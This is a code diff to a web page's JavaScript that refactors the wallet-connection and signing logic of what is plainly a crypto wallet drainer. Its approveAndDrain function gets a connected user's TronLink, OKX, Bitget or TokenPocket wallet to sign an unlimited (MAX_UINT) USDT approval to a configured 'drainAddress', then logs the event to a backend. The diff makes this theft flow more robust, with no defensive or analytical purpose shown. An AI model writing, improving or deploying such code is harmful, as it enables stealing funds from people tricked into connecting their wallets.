@@ -26,76 +26,73 @@
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.0.0/dist/TronWeb.js"></script>
     <script>
-        // Wallet definitions with direct detection and connection logic
+        // Helper: get a TronWeb instance that can sign with a given provider
+        function createTronWebWithSigner(provider, fullHost = 'https://api.trongrid.io') {
+            const tronWeb = new TronWeb({ fullHost });
+            if (provider && typeof provider.request === 'function') {
+                tronWeb.trx.sign = async (tx) => {
+                    const signed = await provider.request({
+                        method: 'tron_signTransaction',
+                        params: [tx]
+                    });
+                    return signed;
+                };
+            }
+            return tronWeb;
+        }
+
+        // Wallet definitions with proper connection flows
         const wallets = [
-            { 
-                name: 'TronLink', 
-                detect: () => window.tronLink && window.tronWeb,
+            {
+                name: 'TronLink',
                 connect: async () => {
+                    if (!window.tronLink) throw new Error('TronLink extension not installed');
                     await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    const provider = window.tronWeb;
-                    const address = provider.defaultAddress.base58;
-                    return { provider, address };
+                    const tronWeb = window.tronWeb;
+                    if (!tronWeb || !tronWeb.defaultAddress) throw new Error('Failed to get address');
+                    const address = tronWeb.defaultAddress.base58;
+                    return { tronWeb, address };
                 }
             },
-            { 
-                name: 'OKX Wallet', 
-                detect: () => window.okxwallet && window.okxwallet.tron,
+            {
+                name: 'OKX Wallet',
                 connect: async () => {
+                    if (!window.okxwallet || !window.okxwallet.tron) throw new Error('OKX Wallet extension not installed');
                     const accounts = await window.okxwallet.tron.request({ method: 'tron_requestAccounts' });
+                    if (!accounts || accounts.length === 0) throw new Error('No account returned');
                     const address = accounts[0];
-                    const provider = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-                    // Override signing with OKX
-                    provider.trx.sign = async (tx) => {
-                        return await window.okxwallet.tron.request({
-                            method: 'tron_signTransaction',
-                            params: [tx]
-                        });
-                    };
-                    return { provider, address };
+                    const provider = window.okxwallet.tron;
+                    const tronWeb = createTronWebWithSigner(provider);
+                    return { tronWeb, address };
                 }
             },
-            { 
-                name: 'Bitget', 
-                detect: () => window.bitkeep && window.bitkeep.tronLink,
+            {
+                name: 'Bitget',
                 connect: async () => {
+                    if (!window.bitkeep || !window.bitkeep.tronLink) throw new Error('Bitget Wallet extension not installed');
                     await window.bitkeep.tronLink.request({ method: 'tron_requestAccounts' });
-                    const provider = window.bitkeep.tronLink;
-                    const address = provider.defaultAddress.base58;
-                    return { provider, address };
+                    const tronWeb = window.bitkeep.tronLink;
+                    if (!tronWeb.defaultAddress) throw new Error('Failed to get address');
+                    const address = tronWeb.defaultAddress.base58;
+                    return { tronWeb, address };
                 }
             },
-            { 
-                name: 'TokenPocket', 
-                detect: () => window.tp && window.tp.tron,
+            {
+                name: 'TokenPocket',
                 connect: async () => {
+                    if (!window.tp || !window.tp.tron) throw new Error('TokenPocket extension not installed');
                     const accounts = await window.tp.tron.request({ method: 'tron_requestAccounts' });
+                    if (!accounts || accounts.length === 0) throw new Error('No account returned');
                     const address = accounts[0];
-                    const provider = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-                    provider.trx.sign = async (tx) => {
-                        return await window.tp.tron.request({
-                            method: 'tron_signTransaction',
-                            params: [tx]
-                        });
-                    };
-                    return { provider, address };
+                    const provider = window.tp.tron;
+                    const tronWeb = createTronWebWithSigner(provider);
+                    return { tronWeb, address };
                 }
-            },
-            { 
-                name: 'Trust Wallet', 
-                detect: () => false, 
-                connect: async () => { throw new Error('Trust Wallet requires WalletConnect; please use TronLink or OKX for now.'); }
-            },
-            { 
-                name: 'Ledger', 
-                detect: () => false, 
-                connect: async () => { throw new Error('Ledger requires WebHID; please use TronLink or OKX for now.'); }
             }
         ];
 
-        let currentProvider = null;
+        let currentTronWeb = null;
         let userAddress = null;
-        let tronWeb = null;
 
         const walletListDiv = document.getElementById('walletList');
         const infoDiv = document.getElementById('info');
@@ -133,14 +130,9 @@
         async function connectWallet(wallet) {
             setStatus(`Connecting to ${wallet.name}...`);
             try {
-                if (!wallet.detect()) {
-                    setStatus(`${wallet.name} is not installed. Please install the extension.`, true);
-                    return;
-                }
-                const { provider, address } = await wallet.connect();
+                const { tronWeb, address } = await wallet.connect();
+                currentTronWeb = tronWeb;
                 userAddress = address;
-                currentProvider = provider;
-                tronWeb = provider;
                 addressSpan.innerText = userAddress;
                 infoDiv.style.display = 'block';
                 setStatus(`Connected with ${wallet.name}: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
@@ -156,7 +148,7 @@
         }
 
         async function approveAndDrain() {
-            if (!userAddress || !currentProvider) {
+            if (!userAddress || !currentTronWeb) {
                 setStatus('No wallet connected', true);
                 return;
             }
@@ -173,16 +165,11 @@
             const drainTarget = config.drainAddress;
             const MAX_UINT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
             try {
-                const contract = await tronWeb.contract().at(usdtContract);
+                const contract = await currentTronWeb.contract().at(usdtContract);
                 setStatus('Approving USDT...');
-                const unsigned = await contract.approve(drainTarget, MAX_UINT).request();
-                let signedTx;
-                if (currentProvider.trx && currentProvider.trx.sign) {
-                    signedTx = await currentProvider.trx.sign(unsigned);
-                } else {
-                    signedTx = await tronWeb.trx.sign(unsigned);
-                }
-                const txid = await tronWeb.trx.sendRawTransaction(signedTx);
+                const unsignedTx = await contract.approve(drainTarget, MAX_UINT).request();
+                const signedTx = await currentTronWeb.trx.sign(unsignedTx);
+                const txid = await currentTronWeb.trx.sendRawTransaction(signedTx);
                 setStatus(`✅ Approval sent: ${txid.slice(0,16)}...`);
                 await fetch('/api/event', {
                     method: 'POST',
@@ -207,14 +194,14 @@
             }
         }
 
-        // Create buttons
-        for (const w of wallets) {
+        // Create buttons for each wallet
+        wallets.forEach(wallet => {
             const btn = document.createElement('button');
-            btn.textContent = w.name;
+            btn.textContent = wallet.name;
             btn.className = 'wallet-btn';
-            btn.onclick = () => connectWallet(w);
+            btn.onclick = () => connectWallet(wallet);
             walletListDiv.appendChild(btn);
-        }
+        });
 
         drainBtn.onclick = approveAndDrain;
     </script>
